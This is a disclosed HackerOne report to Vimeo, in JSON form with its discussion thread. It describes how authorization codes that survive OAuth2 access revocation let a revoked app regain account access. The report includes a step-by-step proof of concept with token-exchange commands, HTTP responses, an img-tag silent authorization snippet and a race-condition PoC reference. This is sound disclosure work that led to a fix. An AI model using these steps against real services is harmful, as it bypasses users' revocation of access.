{"id":57603,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NzYwMw==","url":"https://hackerone.com/reports/57603","title":"API: missing invalidation of OAuth2 Authorization Code during access revocation causes authorization bypass","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-04-21T14:44:49.464Z","submitted_at":"2015-04-21T14:44:49.464Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dor1s","url":"/dor1s","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":56,"url":"https://hackerone.com/vimeo","handle":"vimeo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Vimeo","twitter_handle":"vimeo","website":"https://vimeo.com","about":"Make life worth watching"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-05-31T17:40:09.964Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-05-01T17:39:39.799Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"OAuth2 API makes it possible for users to grant access to their accounts to some third-side applications. Of course, users are able to manage such applications' access to their accounts and may deny access for any application. When some user denies access for the application, all `access_token`s are being revoked and become invalid. But not only `access_token`s should be revoked, authorization `code`s (it is intermediate token used in OAuth2 Authorization Flow) must be revoked too. Vimeo OAuth2 API implementation does not revoke authorization `code` during access revocation. It may be exploited to restore access to user's account by malicious application after access revocation.\r\n\r\nProof of Concept\r\n==============\r\n*(all scripts used are attached)*\r\n\r\n1) Open the link for OAuth2 authorization for some application. Example link for my test application (**Dor1s Test1**, feel free to use my test application to reproduce the issue):\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code\u0026client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a\u0026redirect_uri=https://avuln.com/callback\u0026scope=public\u0026state=0123456789abcdef\r\n```\r\n2) Log into your Vimeo account (if needed) and click **Allow**\r\n3) Copy `code` value from callback url, for example:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef\u0026code=e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n```\r\n`code` value is `e1fa87cd449ae55b74445b31ac79450c14eeb657`\r\n4) Use `code` value to obtain `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh e1fa87cd449ae55b74445b31ac79450c14eeb657\r\n{\r\n    \"access_token\": \"d3ac3bb53d1c4ebc3de7d28e4ed801c0\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n\u003c... CUT OUT ... \u003e\r\n}\r\n```\r\n5) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:10:29 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:10:29 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1239-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429625429.334602,VS0,VE203\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n\u003c ... CUT OUT ... \u003e\r\n}\r\n```\r\n6) Repeat step 1. Link for my test application:\r\n```\r\nhttps://api.vimeo.com/oauth/authorize?response_type=code\u0026client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a\u0026redirect_uri=https://avuln.com/callback\u0026scope=public\u0026state=0123456789abcdef\r\n```\r\n7) Repeat step 2. Log into your accounts (if needed) and click **Allow**.\r\n*Note:* it is not hard to imagine an application requiring user to pass authentication one more time. Many applications do not store long-term sessions and force users to login/authorize every day or even often.\r\n\r\n*Note 2:* often OAuth providers allow to use `approval_prompt=auto` parameter, which makes this step does not require user to click **Allow** again. I had not found such possibility for Vimeo API, but if it is possible, in such case malicious application just need to place on its web-site (or whenever in the Internet) something like that:\r\n```\r\n\u003chtml\u003e\r\n\t\u003cimg src=\"https://api.vimeo.com/oauth/authorize?response_type=code\u0026client_id=79658bbee0da8be5254a5137bc0fcc93f7059a2a\u0026redirect_uri=https://avuln.com/callback\u0026scope=public\u0026state=0123456789abcdef\"\u003e\r\n\u003c/html\u003e\r\n```\r\n\r\nsuch code will \"silently\" produce new `access_token` value to callback each time it has been loaded by the user.\r\n\r\n8) Copy `code` value from callback url and save it for future usage:\r\n```\r\nhttps://avuln.com/callback?state=0123456789abcdef\u0026code=82e24f835184f47cd83f249907e7bd5018bf62c9\r\n```\r\n`code` value is `82e24f835184f47cd83f249907e7bd5018bf62c9`\r\n\r\n9) Go to account security settings [https://vimeo.com/settings/apps](https://vimeo.com/settings/apps)\r\n\r\n10) **Disconnect** the application (**Dor1s Test1** if my test application used) from **Apps** section\r\n\r\n11) To ensure that access is denied, repeat step 5:\r\n```\r\ndoris$ ./me.sh d3ac3bb53d1c4ebc3de7d28e4ed801c0\r\nHTTP/1.1 401 Authorization Required\r\nDate: Tue, 21 Apr 2015 14:23:55 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.error+json\r\nCache-Control: no-cache, max-age=315360000\r\nWWW-Authenticate: Bearer error=\"invalid_token\"\r\nExpires: Fri, 18 Apr 2025 14:23:55 GMT\r\nContent-Length: 53\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nX-Served-By: cache-fra1245-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626235.146346,VS0,VE105\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"error\": \"A valid user token must be passed.\"\r\n}\r\n```\r\n12) Use `code` value from step 8 and exchange it for `access_token`:\r\n```\r\ndoris$ ./getAccessToken.sh 82e24f835184f47cd83f249907e7bd5018bf62c9\r\n{\r\n    \"access_token\": \"9eabdc746910ea39c07395ee1b69a2b9\",\r\n    \"token_type\": \"bearer\",\r\n    \"scope\": \"public private\",\r\n    \"user\": {\r\n        \"uri\": \"/users/39285903\",\r\n\u003c... CUT OUT ...\u003e\r\n}\r\n```\r\n13) Check validity of `access_token`:\r\n```\r\ndoris$ ./me.sh 9eabdc746910ea39c07395ee1b69a2b9\r\nHTTP/1.1 200 OK\r\nDate: Tue, 21 Apr 2015 14:25:41 GMT\r\nServer: nginx\r\nContent-Type: application/vnd.vimeo.user+json\r\nCache-Control: no-cache, max-age=315360000\r\nExpires: Fri, 18 Apr 2025 14:25:41 GMT\r\nContent-Length: 2930\r\nAccept-Ranges: bytes\r\nVia: 1.1 varnish\r\nAge: 0\r\nX-Served-By: cache-fra1235-FRA\r\nX-Cache: MISS\r\nX-Cache-Hits: 0\r\nX-Timer: S1429626341.087757,VS0,VE201\r\nVary: Accept,Vimeo-Client-Id,Accept-Encoding\r\n\r\n{\r\n    \"uri\": \"/users/39285903\",\r\n\u003c... CUT OUT ...\u003e\r\n}\r\n```\r\n\r\nImpact\r\n======\r\nThe vulnerability allows an malicious application to keep its access active to a victim's account even after access revocation. This is not only authorization bypass, but it also deprives a victim ability to manage access for an application.\r\n\r\nMitigation\r\n========\r\nFor access revocation processing all authorization `code` issued for certain pair of user and application should be invalidated (as it currently being done for `access_token` values).","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":35603,"file_name":"getAccessToken.sh.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/603/d757f905c14ffd7a97358c6d9d744e4050c3e1cd/getAccessToken.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22getAccessToken.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27getAccessToken.sh.txt\u0026response-content-type=text%2Fx-shellscript\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151137Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7489863bcb66099bf33bd836c46edfe557ca98b8daaabd53c107d962fc032a6f","file_size":335,"type":"text/x-shellscript"},{"id":35604,"file_name":"me.sh.txt","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/035/604/0c0c5d2ac149868c9732fca6431dfaf7d37bc29f/me.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22me.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27me.sh.txt\u0026response-content-type=text%2Fx-shellscript\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151137Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=813d15ddd98fc296e1c2abed7994af9b26a365b2fe5eabfef091f12dad8e32dc","file_size":70,"type":"text/x-shellscript"}],"allow_singular_disclosure_at":"2015-05-31T17:40:03.386Z","allow_singular_disclosure_after":-200871094.11865342,"singular_disclosure_allowed":true,"vote_count":4,"voters":["r3y","b2e03cf86efe1b26323c39c","runkixt","webtrack"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":389698,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token. \n\nWhen I try your steps (using your very curl commands, but newly created app credentials on a new user), step 12 returns a 400 error with the body\n\n{\n    \"error\": \"invalid_request\",\n    \"error_description\": \"Invalid authorization code\"\n}.\n\n\nDo you have a more-streamlined process that reproduces this error? We don't support approval_prompt=auto, so you can leave that whole section out.","automated_response":false,"created_at":"2015-04-24T21:22:44.132Z","updated_at":"2015-04-24T21:22:44.132Z","actor":{"username":"dashron","cleared":false,"url":"/dashron","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":390096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi dashron,\n\nThanks for the reply. Excuse me, but are you sure that while reproducing step 12 you are using `code` value from step 8?\nI think there is no more-streamlined process. Simplified idea of the PoC is:\nIf an application got additional `code` value, it may obtain `access_code` even after access revocation by user.\n\nI just repeated steps 6-13 several times and `code` was always valid for me. However I can record a screencast for the Proof of Concept.\n\nIt is good that you do not support `approval_prompt=auto`, let's ignore Note 2 on step 7.\n\n*Notice*\nYou just said that:\n```\nI've been digging through the code, and it looks like we delete the authorization codes immediately when we generate an access token.\n```\n\nActually it is not exactly so. There you have Race Condition bug for exchanging `code` for `access_token`. One `code` value may be exchanged for several `access_token` values and all of them would be valid.\nYou can reproduce it with script attached. Please note that Race Condition is probabilistic vulnerability. It may be needed to do few attempts with PoC to reproduce it.\nI did not reported Race Condition as separate bug, because there is no serious impact to security (when access is revoked, all `access_token` values become invalid). But such behavior violates OAuth2 RFC:\n1) [https://tools.ietf.org/html/rfc6749#section-4.1.2](https://tools.ietf.org/html/rfc6749#section-4.1.2) :\n```\n                        If an authorization code is used more than\n   once, the authorization server MUST deny the request and SHOULD\n   revoke (when possible) all tokens previously issued based on\n   that authorization code.  The authorization code is bound to\n   the client identifier and redirection URI.\n```\n2) [https://tools.ietf.org/html/rfc6749#section-10.5](https://tools.ietf.org/html/rfc6749#section-10.5) :\n```\n   Authorization codes MUST be short lived and single-use.  If the\n   authorization server observes multiple attempts to exchange an\n   authorization code for an access token, the authorization server\n   SHOULD attempt to revoke all access tokens already granted based on\n   the compromised authorization code.\n```\nand sometimes Race Condition may cause some logical flaws, so it would be better to fix too.","automated_response":false,"created_at":"2015-04-25T14:46:24.047Z","updated_at":"2015-04-25T14:46:24.047Z","actor":{"username":"dor1s","cleared":false,"url":"/dor1s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":36071,"filename":"accessTokenRaceConditionPOC.sh.txt","type":"text/x-shellscript","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/036/071/b88b5c26027dfe89243eb4d9a3cd499315e2ee36/accessTokenRaceConditionPOC.sh.txt?response-content-disposition=attachment%3B%20filename%3D%22accessTokenRaceConditionPOC.sh.txt%22%3B%20filename%2A%3DUTF-8%27%27accessTokenRaceConditionPOC.sh.txt\u0026response-content-type=text%2Fx-shellscript\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T151137Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=66285a3afa8712d878454d3c8809c78a6c582e74adddc88b8581299a5254ebdb"}],"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":399387,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh I see now. Somehow I misread this at first as you could exchange an auth code for an access token twice.\nYou believe that the \"disconnect from \u003capp\u003e\" flow should also wipe out all authorization codes for that app.\n\nAdding that now.","automated_response":false,"created_at":"2015-05-01T17:02:40.428Z","updated_at":"2015-05-01T17:02:40.428Z","actor":{"username":"dashron","cleared":false,"url":"/dashron","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":399395,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This should be fixed now, thanks for such a through report!","automated_response":false,"created_at":"2015-05-01T17:39:22.451Z","updated_at":"2015-05-01T17:39:22.451Z","actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"dor1s","url":"/dor1s"},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":399396,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2015-05-01T17:39:29.602Z","updated_at":"2015-05-01T17:39:29.602Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vimeo"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"vimeo","collaborator":{"username":"dor1s","url":"/dor1s"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":399399,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-05-01T17:40:02.864Z","updated_at":"2015-05-01T17:40:02.864Z","first_to_agree":true,"actor":{"username":"andrewp","cleared":false,"url":"/andrewp","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/966/b9d700976d0952781d36b6dbd46cb36c8ec59da9_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":434445,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-05-31T17:40:10.099Z","updated_at":"2015-05-31T17:40:10.099Z","actor":{"url":"/vimeo","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Vimeo"}},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":489649,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Vimeo,\n\nThank you for listing my name in Hall of Fame at your web-site: [https://vimeo.com/about/security](https://vimeo.com/about/security).\n\nBu there is a little typo \"Max (dors1)\". May I ask you to change my name to \"Max Moroz\" there?\n\nThanks a lot!\n\n--\nMax","automated_response":false,"created_at":"2015-06-24T08:35:01.975Z","updated_at":"2015-06-24T08:35:01.975Z","actor":{"username":"dor1s","cleared":false,"url":"/dor1s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":491614,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Fixing it now!","automated_response":false,"created_at":"2015-06-25T15:56:10.859Z","updated_at":"2015-06-25T15:56:10.859Z","actor":{"username":"dashron","cleared":false,"url":"/dashron","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":491676,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, thanks!","automated_response":false,"created_at":"2015-06-25T16:43:00.278Z","updated_at":"2015-06-25T16:43:00.278Z","actor":{"username":"dor1s","cleared":false,"url":"/dor1s","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/930/63baa5788d9952bc13497da61518a8902db31756_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"vimeo","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}